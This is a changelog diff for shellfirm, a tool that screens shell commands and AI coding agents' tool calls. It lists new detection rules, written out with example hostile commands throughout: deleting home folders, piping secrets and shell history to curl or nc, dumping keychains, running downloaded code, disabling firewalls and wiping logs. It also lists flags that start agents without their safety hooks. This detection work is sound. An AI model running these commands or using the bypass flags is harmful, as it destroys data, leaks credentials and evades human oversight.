@@ -1,5 +1,242 @@
 ## Unreleased
 
+### Added
+
+- **Whole home folders.** Recursively deleting a well-known folder of a home
+  directory by name (`rm -rf ~/Documents`, `~/Projects`, `~/Library`,
+  `~/.config`, `~/.ssh`, `~/.aws`, `/Users/alice/Library`,
+  `/home/bob/Documents`), in any spelling the parser already follows (quotes,
+  `\rm`, `/bin/rm`, variables, split or long flags, `cd ~ && rm -rf
+  Documents`, `bash -c`), is High (`fs:delete_home_folder`), whether or not
+  the folder exists where shellfirm runs. A file or folder inside one
+  (`~/Documents/old.txt`, `~/Library/Caches/app`, `~/Projects/app/dist`) is
+  not matched. Moving one into a temporary folder (`mv ~/Projects /tmp/x`,
+  `mv -t /tmp ~/Projects`, `mv --target=/tmp ~/Projects` and any other
+  prefix of `--target-directory`, `rsync --remove-source-files ~/Documents
+  /tmp/x`) is High (`fs:move_home_folder`).
+- **Secrets reconnaissance and printing.**
+  - Listing a credential or wallet folder (`ls -la ~/.ssh ~/.aws`, `tree
+    ~/.gnupg`, `find ~/.ssh`, `~/Library/Keychains`, wallet folders under
+    `~/Library/Application Support`) is Medium (`exfil:list_secret_dir`).
+    So are `du -a ~/.ssh`, `stat ~/.ssh/*` and `file ~/.ssh/*`. `ls ~`, `ls
+    ~/.config`, `ls ~/.ssh/*.pub`, and commands that show no file names
+    (`ls -ld ~/.ssh`, `tree -d ~/.aws`, `stat ~/.ssh`, `du -sh`, `find
+    ~/.ssh -name '*.pub'` with no other name test) are not matched.
+  - Printing a secret environment variable on the terminal (`echo
+    $GITHUB_TOKEN`, `printenv AWS_SECRET_ACCESS_KEY`, `env | grep -i token`,
+    part of one with `${GITHUB_TOKEN:0:8}`) is Medium
+    (`exfil:print_secret_env`). Piping it into another command (`echo "$T" |
+    docker login --password-stdin`), writing it to a file, single-quoted
+    text, `${T:+set}` / `${#T}`, names that hold a location (`TOKEN_URL`,
+    `AWS_ACCESS_KEY_ID`, `GOOGLE_APPLICATION_CREDENTIALS`), a count or limit
+    (`MAX_TOKENS`, `PROMPT_TOKENS`, `GH_TOKEN_SCOPES`) and values that are
+    public by design (`JWT_PUBLIC_KEY`, `STRIPE_PUBLISHABLE_KEY`,
+    `SUPABASE_ANON_KEY`, browser-bundled `NEXT_PUBLIC_*`, `EXPO_PUBLIC_*`,
+    `VITE_*`, `REACT_APP_*`) are not matched, unless the name also says
+    secret, password or private (`NEXT_PUBLIC_SECRET`, `DB_PASSWORD_PUBLIC`).
+  - A secret variable piped into a network client as the request body
+    (`echo $GITHUB_TOKEN | curl -d @- https://…`, `| nc host 80`) is High
+    (`exfil:secret_env_to_network`); a header (`curl -H @-`) or a login
+    (`--password-stdin`) is not matched.
+  - Reading the login file of a hosting CLI (Railway
+    `~/.railway/config.json`, Supabase `~/.supabase/access-token`, Vercel
+    `auth.json`, Netlify `config.json`, Fly.io `~/.fly/config.yml`) is
+    Medium, like other credential files (`exfil:read_secret_file`). Printing
+    every variable of a service (`railway variables`, `railway run env`,
+    `vercel env pull --environment=production`) is Medium
+    (`exfil:print_token`).
+  - macOS keychain passwords printed or dumped (`security
+    find-generic-password -w`, `find-internet-password -w`, `dump-keychain`,
+    `export -t identities`, or subcommands fed to `security -i`), also after
+    global options (`security -v …`, `security 2>&1 …`), are High
+    (`exfil:keychain_dump`); `security find-identity` is not.
+  - Shell history sent to the network (`history | curl -d @- …`, `cat
+    ~/.zsh_history | nc host 4444`, `curl -F f=@~/.bash_history …`, `curl
+    -d @- … < ~/.bash_history`) is High (`exfil:history_to_network`).
+- **Destructive API calls.** An HTTP `DELETE` with credentials on the line
+  (`curl -X DELETE -H "Authorization: …"`, `-u`, `http DELETE …
+  Authorization:…`, `http -a user:pw DELETE …`, `xh --bearer T DELETE …`,
+  `wget --method=DELETE
+  --header=…`) is High (`network:http_delete_authenticated`); without
+  credentials it is Medium (`network:http_delete`). A local development
+  server (`localhost`, `127.0.0.1`, `[::1]`, `*.localhost`,
+  `host.docker.internal`, the httpie `:3000/…` shorthand) is not matched by
+  either, unless the path starts with `_` or holds a `*`
+  (`localhost:9200/_all`). A GraphQL mutation with a top-level field that
+  deletes or archives something (`volumeDelete(…)`, `deleteRepository(…)`,
+  `delete_users(…)`, `archiveRepository(…)`), sent with `curl`, `http`,
+  `wget` or `gh api graphql`, is High
+  (`network:graphql_destructive_mutation`). Every top-level field is read,
+  stepping over arguments and string literals (also JSON-escaped ones), so
+  a `)` in an issue title does not hide a later field, and a mutation
+  written inside a comment body is not one; when a string or bracket is
+  left open, every name after `mutation` counts. Queries, relationship
+  edits (`removeLabelsFromLabelable`, `removeStar`, `issueRemoveLabel`) and
+  local servers are not matched.
+- **Hosting and repository settings.** `railway variables delete`, `railway
+  environment delete` and other single Railway resources
+  (`heroku:railway_resource_delete`), `vercel alias rm`, `vercel dns rm`,
+  `vercel blob del` (`vercel:alias_remove`, `vercel:dns_remove`,
+  `vercel:blob_delete`), `supabase functions delete`, `supabase secrets
+  unset` and `supabase storage rm` (`database:supabase_remote_delete`), `gh
+  api … -f visibility=public` (`github:api_make_public`), turning Actions
+  off through the API (`github:api_disable_actions`), `vercel teams rm`
+  (`vercel:team_remove`) and `vercel integration remove`
+  (`vercel:integration_remove`) are High. `gh workflow disable`
+  (`github:workflow_disable`), `gh secret set NAME < /dev/null` and `gh
+  secret|variable set NAME --body ""` (`github:secret_set_empty`), `gh api
+  -X DELETE repos/OWNER/REPO/hooks/ID` (`github:api_delete_webhook`) and
+  `supabase db push` to the linked project or a database URL
+  (`database:supabase_db_push_remote`; `--local` and `--dry-run` are not
+  matched) are Medium.
+- **Defense evasion.** Stopping or disabling the firewall service
+  (`systemctl stop firewalld`, `service ufw stop`, `socketfilterfw
+  --setglobalstate off` / `=off`, unloading `com.apple.alf`, `pfctl -d`) is
+  High (`network:stop_firewall`); `ufw --force disable` is Critical like
+  `ufw disable`. Turning shell history off (`unset HISTFILE`, `export
+  HISTFILE=/dev/null`, `HISTSIZE=0`, `set +o history`, `shopt -u -o
+  history`) is Medium (`base:disable_history`), and so is deleting or
+  emptying the history file (`rm ~/.bash_history`, `> ~/.zsh_history`,
+  `base:clear_history_file`). Emptying system logs (`truncate -s 0
+  /var/log/auth.log`, `: > /var/log/syslog`) is High
+  (`base:wipe_system_logs`).
+- **Inline code that runs a download.** `python3 -c
+  "exec(urlopen(URL).read())"`, `node -e "… https.get(URL) … eval(d)"`,
+  `ruby -e "eval(Net::HTTP.get(…))"` and the `perl` / `php` equivalents are
+  High (`shell:interpreter_remote_exec`), like `curl … | python3`, also
+  through `builtins.exec(…)`, `__builtins__.exec(…)` or `getattr(__builtins__,
+  'exec')(…)`. A method named eval (`model.eval()`, `df.eval(…)`) is not
+  matched.
+- **Hard links.** A hard link to a credential file, a shell startup file or a
+  git hook (`ln ~/.bashrc x`, `ln -f ~/.ssh/id_rsa k`, `ln -- …`, `ln
+  --target-directory=. …`, `ln --suffix=.x …`, `link ~/.ssh/id_rsa k`, `cp
+  -l ~/.zshrc z`, `cp -al ~/.ssh keys`) is Medium
+  (`fs:hard_link_protected_file`): writing or reading the link changes or
+  reads the original without its path. Symbolic links (`ln -s`,
+  `--symbolic`) are not matched.
+- **Agent settings folders.** Moving the folder that holds an AI agent's
+  settings and shellfirm's hook away (`mv ~/.claude /tmp/old`, `mv ~/.codex
+  …`, `mv -t /tmp ~/.claude`, also at `$CLAUDE_CONFIG_DIR` / `$CODEX_HOME`)
+  or removing a repository's agent hook folder (`git rm -r .github/hooks`)
+  is High (`fs:move_agent_settings_dir`). A file inside it (`mv
+  ~/.claude/projects/x /tmp`) and `git rm --cached` are not matched.
+- **`shellfirm audit replay`: replay past AI-agent sessions.** Reads the
+  session transcripts coding agents keep on disk (Claude Code:
+  `~/.claude/projects`, subagent sessions included; Codex CLI:
+  `~/.codex/sessions` and `archived_sessions`) and judges every shell command
+  and file operation the agent ran exactly as that agent's hook (`shellfirm
+  check --hook claude-code` / `--hook codex`) would have, with the recorded
+  working directory, your agent settings and the project policies that apply
+  there (Codex cannot ask, so its asks are denies, as in its hook, except an
+  edit of only agent-instruction files, which Codex lets through with a note:
+  an allow). An `apply_patch` run through the shell, also by a Claude Code
+  `Bash` call and inside `bash -lc "…"`, is judged by the files it touches,
+  as the hook does. The report lists
+  sessions and calls per agent, the deny / ask / allow totals, and the
+  findings worst first, identical calls grouped (`×N`), each with the time,
+  agent, project, rule, severity and reason. Options: `--since 24h|7d|30d|all`
+  (default `7d`), `--agent claude-code|codex|all`, `--project PATH`,
+  `--min-severity LEVEL`, `--limit N`, `--json` (one line per finding, then a
+  summary), `--redact` (rule ids and reasons only, for sharing) and
+  `--fail-on deny|ask` (exit 11 / 10, as `check --exit-code`). Read-only:
+  nothing from a transcript runs, no external program is started for
+  context, the LLM review is off, and nothing is written (not even the audit
+  log). Secrets in commands are shown as `***` (as in the audit log), and
+  control characters are escaped. Malformed, oversized (over 16 MiB) and
+  unreadable lines, calls (also input of the wrong shape), files and
+  directories (the agent's folder, such as an unreadable `~/.claude`,
+  included) are skipped and counted; Codex rollouts compressed after a week
+  (`.jsonl.zst`) are counted but not read, and so is anything named like a
+  transcript that is not a regular file (a FIFO, a device, a symbolic link,
+  a folder), which is never opened. Either makes the replay
+  incomplete: stderr says so, the JSON summary has `incomplete: true`, and
+  with `--fail-on` the run exits 66 unless a deny or ask exit applies. Calls
+  without a valid timestamp are counted and judged only with `--since all`.
+  An invalid or future `--since` (here and in `audit show`), an empty
+  `--project` or one that is not a directory exits 2. A relative
+  `$CLAUDE_CONFIG_DIR` is resolved against the current directory. A `Read`
+  is judged as the hook judges it, also under a home or
+  `$CLAUDE_CONFIG_DIR` the checks do not spell.
+
+- **`shellfirm sandbox <agent>`: turn on the AI agent's own OS sandbox and
+  deny it your credential files.** The hooks read the command text; a script
+  or child process that opens `~/.ssh/id_rsa` at runtime never shows up in
+  it. `shellfirm sandbox claude-code` writes `sandbox.enabled` and
+  `sandbox.filesystem.denyRead` / `denyWrite` into Claude Code's settings
+  (`--scope user|project|local`); `shellfirm sandbox codex` adds a
+  permission profile with `"deny"` / `"read"` filesystem entries to
+  `~/.codex/config.toml` (comments and layout kept). Sandboxed commands then
+  cannot read SSH and GPG keys, cloud, registry and token files or
+  keychains, nor write shell startup files, SSH and git config, autostart
+  entries, agent settings or shellfirm's configuration. Existing settings are
+  merged and never weakened; `--dry-run` shows the change, `--remove` takes
+  out only what shellfirm added (recorded in `sandbox.json` in the
+  configuration directory) and `--list` shows the supported agents (Gemini
+  CLI and Copilot CLI are listed as unsupported, with the reason) and the
+  paths. The lists are the ones the agent file-tool checks use; add or drop
+  entries with the new `sandbox.deny_read`, `sandbox.deny_write` and
+  `sandbox.exclude` settings. `shellfirm status` and `shellfirm doctor` show
+  each configured sandbox and warn when entries went missing, and in agent
+  mode `shellfirm sandbox … --remove` asks first
+  (`shellfirm-self:sandbox_remove`). See [Agent sandbox](docs/sandbox.md).
+
+- **Blocking hooks for more AI agents.** `shellfirm connect` now installs a
+  hook that runs before the agent's tool calls, and `shellfirm check --hook
+  <agent>` answers in that agent's own format:
+  - `codex`: OpenAI Codex CLI `PreToolUse` hook (`~/.codex/hooks.json`,
+    shell commands and `apply_patch` edits; Codex 0.124.0 or later, and Codex
+    asks you to trust the hook first).
+  - `gemini`: Gemini CLI `BeforeTool` hook (`~/.gemini/settings.json`; shell
+    commands, writes, edits and reads).
+  - `qwen`: Qwen Code `PreToolUse` hook (`~/.qwen/settings.json`).
+  - `copilot`: GitHub Copilot CLI `preToolUse` hook
+    (`~/.copilot/hooks/shellfirm.json`, or `.github/hooks/shellfirm.json` for
+    a repository).
+  - `windsurf`: Cascade `pre_run_command`, `pre_write_code` and
+    `pre_read_code` hooks (`~/.codeium/windsurf/hooks.json`), besides the MCP
+    server.
+  - `cline`: a `PreToolUse` hook script (`~/Documents/Cline/Hooks`), besides
+    the MCP server; it cancels the tool call when shellfirm cannot run.
+  - `opencode`: an OpenCode plugin (`~/.config/opencode/plugins/shellfirm.js`)
+    that blocks the call unless shellfirm allows it.
+
+  Gemini CLI, Qwen Code and Copilot CLI ask you about risky commands; Codex,
+  Windsurf, Cline and OpenCode hooks cannot ask, so shellfirm blocks those
+  with the reason and a safer alternative. Malformed hook input is denied in
+  every agent. All of them support `--scope project`, `--dry-run` and
+  `--uninstall`, keep your own hooks, read JSON with comments and back up the
+  files they change. `shellfirm status` lists the new hooks (with notes such
+  as a hook turned off in Gemini's settings), and `shellfirm doctor` reports
+  each installed agent hook. See [docs/agents.md](docs/agents.md).
+- Agent patches (`apply_patch` in Codex, Cline, OpenCode and Copilot,
+  OpenCode `patch`, and `apply_patch` run through a shell command) are
+  checked file by file, like a write of every file they touch. The worst file
+  decides, whatever the order, and the reason names it; the
+  agent-instruction exemption applies only when every file is an instruction
+  file. Copilot `write_bash` input is checked as a command, Gemini
+  `read_many_files` as a read of every path, and OpenCode `multiedit` as an
+  edit (the OpenCode plugin forwards `multiedit` and `patch`, and shows the
+  review note of an allowed instruction edit as a toast).
+- Agent self-protection covers the new hook files and plugins (Codex
+  `hooks.json`, Gemini and Qwen `settings.json`, Copilot hook files, Windsurf
+  `hooks.json`, Cline hook scripts, OpenCode plugins), and an agent starting
+  another agent without its checks asks like the other hook bypasses:
+  `codex --dangerously-bypass-hook-trust`, `codex --sandbox
+  danger-full-access` (`-s`, `-c sandbox_mode=danger-full-access`), `qwen
+  --safe-mode`, `gemini -y` / `qwen -y` / `--approval-mode yolo`, `copilot
+  --yolo` / `--allow-all-tools` / `--allow-all`, and a fresh `CODEX_HOME`,
+  `COPILOT_HOME`, `GEMINI_CLI_HOME` or `QWEN_HOME`
+  (`shellfirm-self:config_env_override`).
+- Cursor `beforeReadFile` hooks are checked as file reads (a secret-file
+  read is denied there, since Cursor cannot ask about it; other reads get no
+  answer), and Cursor `preToolUse` `Read` calls are checked as reads too.
+- **Key and credential files.** A file tool overwriting a private key or
+  credential file in the home directory (`~/.ssh/id_rsa`,
+  `~/.aws/credentials`, `~/.git-credentials`, ...) asks
+  (`shellfirm-self:credential_file_edit`, kept with `agent.self_protection:
+  false`); deleting one (`*** Delete File:`, Cursor `Delete`) is Critical and
+  denied, like `rm` of it. This covers Claude Code's `Write` / `Edit` too.
+
 ### Fixed
 
 - **fish:** on fish 4.1+, commands such as `cd`, `prevd`, `nextd`
@@ -12,6 +249,211 @@
   fish's own or your own file, and also through `alias`.
 - **fish:** commands inside a `{ …; }` block and every command
   substitution on a line are checked, not only the first four.
+- Credential and startup-file paths are matched in any case (`rm
+  ~/.SSH/id_rsa`, `scp ~/.Aws/credentials host:`, `ls -la ~/.Ssh`, `echo …
+  >> ~/.BashRC`), since macOS and Windows file systems ignore case.
+  `fs:delete_credentials` also covers `~/.git-credentials`.
+- A doubled `/` in a path is read as one (`rm -rf ~//Documents`, `cat
+  ~/.ssh//id_rsa`), as the file system reads it.
+- An absolute path inside a home directory the checks do not spell
+  (`rm -rf /var/lib/jenkins/.ssh`, `cat /var/lib/jenkins/.aws/credentials`,
+  `ls -la /var/lib/jenkins/.ssh`, `curl -F f=@/var/lib/jenkins/.ssh/id_rsa
+  …` with `HOME=/var/lib/jenkins`, also written `HOME=/var/lib/jenkins/`)
+  is checked like its `~/…` form, by every rule. In the same way a path
+  inside `$CLAUDE_CONFIG_DIR` or `$CODEX_HOME` (absolute, or relative to the
+  working directory) is checked like `~/.claude/…` / `~/.codex/…`, so `cat
+  /tmp/ccd/.credentials.json` and `curl -F f=@$CODEX_HOME/auth.json …` are
+  caught like the default location. Uploading an agent login file (`curl -F
+  f=@~/.claude/.credentials.json …`) is High (`exfil:upload_secret_file`).
+- `tar --remove-files` (also abbreviated, `--remove`, and as `gtar`) and `7z
+  a -sdel` delete what they archive, like `zip -m` (`fs:zip_move`), and
+  `tar --remove-files … ~/.ssh` is `fs:move_credentials`; `mv --target=DIR`
+  (any prefix of `--target-directory`) is read like `mv -t DIR`.
+- Archiving a repository through the REST API (`gh api -X PATCH
+  repos/OWNER/REPO -f archived=true`) is High, like `gh repo archive`
+  (`github:repo_archive`).
+- The audit log (and `audit replay`) redacts more secrets: `docker login -p
+  …` / `--password …` (and `podman`, `nerdctl`, `buildah`, `skopeo`, `helm
+  registry login`), `apikey:` / `api-key:` / `X-Access-Token:` headers, JSON
+  Web Tokens (`eyJ….eyJ….…`) anywhere in a command, Stripe secret and
+  restricted keys (`sk_live_…`, `rk_live_…`), GitLab tokens (`glpat-…`),
+  npm tokens (`npm_…`), `aws configure set aws_secret_access_key …` /
+  `aws_session_token …` and `npm config set …:_authToken …` (and `_auth`,
+  `_password`; also `pnpm`, `yarn`).
+- `audit show --since` accepts `all`, and RFC 3339 timestamps with
+  fractional seconds (`2026-01-31T10:00:00.123Z`) or an offset (`+02:00`, or
+  `+0200`); a timestamp without an offset is taken as UTC.
+- Agent hooks: a file-tool path starting with `~/` is in the home directory,
+  so a `Read` of `~/.ssh/id_rsa` asks like the absolute path. File reads are
+  called a "file read" in the reason and logged as `Read <path>` (not as a
+  `cat` the agent never ran). A tool call whose command or path holds a NUL
+  byte is denied (failing closed). A patch's reason names its tool
+  (`This apply_patch call …`, not `Write`).
+- Agent reasons list the matched rules most severe first, so a High
+  self-protection rule leads a Low generic one.
+- `… | sponge FILE` is a write of FILE for self-protection
+  (`echo '{}' | sponge ~/.codex/hooks.json`).
+- Agent hooks: a patch run as the script of a shell (`bash -lc "apply_patch
+  <<'EOF' … EOF"`, `sh -c`, `zsh -lc`) has its files judged, the same as
+  the `apply_patch` tool (a patch of instruction files only goes ahead with
+  a note where the agent cannot ask).
+- Agent hooks: with `CLAUDE_CONFIG_DIR`, `CODEX_HOME` or `COPILOT_HOME` set,
+  the agent's settings and hook files there (`$CLAUDE_CONFIG_DIR/settings.json`,
+  `$CODEX_HOME/hooks.json`, ...) are protected like `~/.claude/…`, and its
+  login file (`$CLAUDE_CONFIG_DIR/.credentials.json`, `$CODEX_HOME/auth.json`)
+  is a credential file for reads and edits.
+- Agent hooks: home-directory key and credential paths match whatever their
+  case (`~/.SSH/id_rsa`, `~/.Aws/credentials`).
+- Copilot `write_bash` input that presses an editing or history key
+  (`{backspace}`, `{left}`, `{home}`, `{up}`, `{down}`, `{tab}`, ..., in any
+  case: `{BACKSPACE}`), holds a raw control character other than a newline
+  (Ctrl-U, Backspace, an escape sequence, a tab) or uses bash history
+  expansion (`!!`, `!$`, `!-1`) is denied, since what it runs cannot be read
+  from the text; `{ctrl+d}` and a final `{esc}` are allowed.
+  `write_powershell` is checked like `write_bash`.
+- Gemini / Qwen `read_many_files` of a directory (`~/.ssh`) is checked like a
+  read of everything in it, and a directory or glob that holds or matches a
+  key or credential file (`~`, `~/.kube`, `~/.gnupg`, `~/.ss?`,
+  `~/.aws/**`, `**/*` from the home directory) like a read of that file; a
+  call without a list of paths is reported as a file read that cannot be
+  checked.
+- Agent hooks: a patch run as `applypatch` (Codex's other name for it) is
+  judged like `apply_patch`, an ANSI-C quoted patch (`apply_patch $'…'`) is
+  decoded, and a patch whose content cannot be seen (`apply_patch < p.diff`,
+  `apply_patch "$(cat p.diff)"`) needs approval.
+- Agent hooks: a relative `CLAUDE_CONFIG_DIR` (or `CODEX_HOME`,
+  `COPILOT_HOME`) is resolved against the hook's current directory, so the
+  files `shellfirm connect` writes there are protected.
+- Codex: an argv `command` (`["bash", "-lc", "…"]`), `cmd`, and the shell tool
+  names `shell`, `exec_command` and `local_shell` are checked as commands;
+  `tool_input.workdir` is where the command runs.
+- Cursor: a `Read` through `preToolUse` that would ask is denied (Cursor does
+  not enforce `ask` for reads), and a `beforeReadFile` without a path is
+  reported as a file read.
+- `shellfirm-self:agent_hooks_bypass` also matches `codex -c
+  features.hooks=false`, `codex --disable hooks`, `codex -c
+  default_permissions=':danger-full-access'`, `codex -sdanger-full-access`,
+  `cursor-agent --force` / `--yolo` and `opencode run
+  --dangerously-skip-permissions`, Codex `-c` overrides in any spelling
+  (`-cfeatures.hooks=false`, `features={hooks=false}`,
+  `profiles.<name>.sandbox_mode=danger-full-access`), Gemini short-flag
+  groups (`gemini -yp x`), and agents started by their npm package (`npx
+  @google/gemini-cli -y`, `bunx`, `pnpm dlx`). It reads only the agent
+  command's own options, with each CLI's own option rules: a prompt
+  (`gemini -p "say -y"`, `--prompt="use -y"`), a subcommand's option
+  (`gemini extensions install foo -y`) and a longer flag (`--yolo-free`) are
+  no longer matched, while a switch does not hide the flag after it
+  (`claude -p --dangerously-skip-permissions`, `cursor-agent -p --force`,
+  `gemini -s -y`) and Gemini / Qwen read a word starting with `-` as an
+  option (`gemini -p -y`).
+- `shellfirm-self:config_env_override` matches only an assignment that sets
+  the variable (a command prefix, `export`, `env`, `declare -x`), not text
+  (`echo CODEX_HOME=/tmp`, a search pattern: `grep "export CODEX_HOME="
+  ~/.zshrc`), an `.env.example` template, or `unset` of an agent home
+  variable (which puts the agent back on its default home).
+- `shellfirm connect claude-code --no-fail-closed` run by an agent needs
+  approval (`shellfirm-self:connect_fail_open`): it lets the agent go ahead
+  when the hook fails (only `connect claude-code` has the flag).
+
+- `wsl -d`, `wsl -u`, `wsl --cd` (an option missing its value at the end of
+  the command) no longer crash the command parser: the agent hook denied
+  such a command (failing closed) and `check` exited with a panic.
+- `shellfirm connect … --scope project` and `shellfirm sandbox … --scope
+  project|local` refuse a settings file, or a directory on its path, that is
+  a symlink out of the project, instead of writing through it (a link
+  planted in a repository could make them change another agent's user
+  settings). `status` and `doctor` report such a link.
+- `shellfirm status` and `doctor` report a Claude Code hook as off when
+  `disableAllHooks` is true in the settings file that decides it (managed,
+  local, project or user), and a Codex hook when `[features] hooks` (or
+  `codex_hooks`) is false; `status` shows `hook OFF` with how to turn it back
+  on, and `connect` prints the same. `doctor` suggests re-running `connect`
+  only when that fixes the problem. A Claude Code hook is also reported off
+  when managed settings set `allowManagedHooksOnly: true` (only managed hooks
+  run). A shellfirm hook in Claude Code's managed settings is listed as
+  `claude-code (managed)`, and with `allowManagedHooksOnly` it keeps the
+  user hook that no longer loads from failing `doctor`;
+  [docs/agents.md](docs/agents.md#managed-settings) shows the entry to put
+  there.
+- `shellfirm connect claude-code`, `shellfirm sandbox claude-code`, `status`
+  and `doctor` use `$CLAUDE_CONFIG_DIR` (its `settings.json` and
+  `.claude.json`) when it is set, a relative one resolved against the
+  current directory. `shellfirm sandbox claude-code` then also denies reads
+  of `$CLAUDE_CONFIG_DIR/.credentials.json` and writes to its
+  `settings.json` and `.claude.json`.
+- `shellfirm connect gemini` takes shellfirm out of `hooksConfig.disabled`
+  (the hook was reported as installed while Gemini CLI skipped it).
+- `shellfirm connect cursor` adds a `beforeReadFile` hook, so agent reads of
+  private keys and credential files are checked.
+- `shellfirm doctor` exits 0 on a machine that has AI-agent hooks in order and
+  no shell hook at all; the shell findings are warnings there.
+- Backups next to a user-scope settings file no longer pile up: the newest 3
+  shellfirm backups of each file are kept (a file of yours such as
+  `settings.json.shellfirm-bak-mine` is neither counted nor deleted).
+- `connect`, `sandbox`, `status` and `doctor` report a settings path that is
+  not a regular file (a FIFO) as an error instead of hanging on it. The same
+  holds for shellfirm's own `settings.yaml` and a project `.shellfirm.yaml`
+  (every command, the agent hook and the shell hook included): such a file
+  is reported like an invalid one and not read.
+- `status` and `doctor` report an agent folder they cannot read (`chmod 000
+  ~/.claude`, `$CLAUDE_CONFIG_DIR`, `~/.codex`) as an error (`can't read
+  …`), not as "not installed".
+- `shellfirm connect qwen` adds `read_many_files` to the Qwen Code matcher,
+  for versions that expose that tool.
+- `shellfirm doctor` warns about a Cline or OpenCode hook file shellfirm did
+  not write, as `status` does.
+- A project-scope `connect --uninstall` removes the directories it left
+  empty (`.github` after Copilot), and `status` lists files `connect`
+  refuses (a `hooks` key that is not an object, a Cline or OpenCode hook file
+  shellfirm did not write).
+- When a settings file cannot be written (read-only), `connect` and `sandbox`
+  print the error without the change list, and the note that comments will
+  not be kept comes before the list.
+- `shellfirm sandbox`: refuses Codex profiles that run without a sandbox
+  through the active `[profiles.<name>]` or a permission profile extending
+  `:danger-full-access`; reports settings in any Claude Code scope that
+  re-open a denied path (an `allowRead` / `allowWrite` entry equal to or
+  inside it, also spelled with the absolute home path) and Codex entries
+  that do, in the command output and in `status` / `doctor` (no longer
+  `read denies 32/32` then, and no re-run suggestion a re-run cannot fix);
+  takes out entries an `exclude` added later leaves out; denies reads of
+  Railway, Supabase, Vercel, Netlify and Fly.io CLI login files; refuses a
+  `deny_read` / `deny_write` entry that is `/`, the home directory or a
+  directory above it (`~`, `/home/you`, `/home`, `//`), an empty entry and one
+  with an unexpanded `$VAR`, and resolves `..`, with `status` / `doctor`
+  naming the refused entry instead of suggesting a re-run; prints the
+  settings-file warnings; accepts `gemini` and `copilot` like `connect` and
+  explains why every other agent `connect` knows (Cursor, Qwen Code, …) is
+  not supported; names the right scope when it refuses a symlink; and says
+  to keep a `.claude/settings.local.json` it creates out of git.
+- `shellfirm status` and `doctor` show `sandbox off` when a project or local
+  Claude Code settings file sets `sandbox.enabled: false` over the one
+  shellfirm wrote, or a project `.codex/config.toml` runs Codex without a
+  sandbox or selects another permission profile; `shellfirm sandbox` warns
+  about the same. An entry in a project `.codex/config.toml` that re-opens a
+  denied path in shellfirm's profile is reported as `weakened:` (Codex
+  merges it over the user file).
+- `shellfirm sandbox` saves its record of what it added before it writes the
+  settings file, so a record that cannot be saved leaves the file unchanged
+  (and `--remove` no longer leaves `sandbox.enabled: true` behind in a file
+  shellfirm created).
+
+### Changed
+
+- `fs:recursive_delete_home_glob` matches everything in a home folder or a
+  folder one level down (`rm -rf ~/Documents/*`, `~/projects/webapp/*`).
+  A deeper folder (`~/projects/webapp/dist/*`) is left to
+  `fs-strict:recursive_deletion`, and emptying `~/.cache`, `~/.Trash`,
+  `~/Library/Caches` or `~/.npm/_logs` is not matched.
+- `heroku:railway_delete` matches only `railway delete` / `railway project
+  delete`; deleting one variable, environment or service is
+  `heroku:railway_resource_delete`, with its own description.
+- Faster checks: the index of Critical checks used to stop reading a SQL
+  file early (`psql -f`) is built only when a SQL file is read, not for every
+  command.
+- `shellfirm connect windsurf` and `shellfirm connect cline` install a hook
+  as well as the MCP server (`--mcp-only` keeps the old behaviour), and both
+  accept `--scope project` for the hook.
 
 ## 0.4.1
 
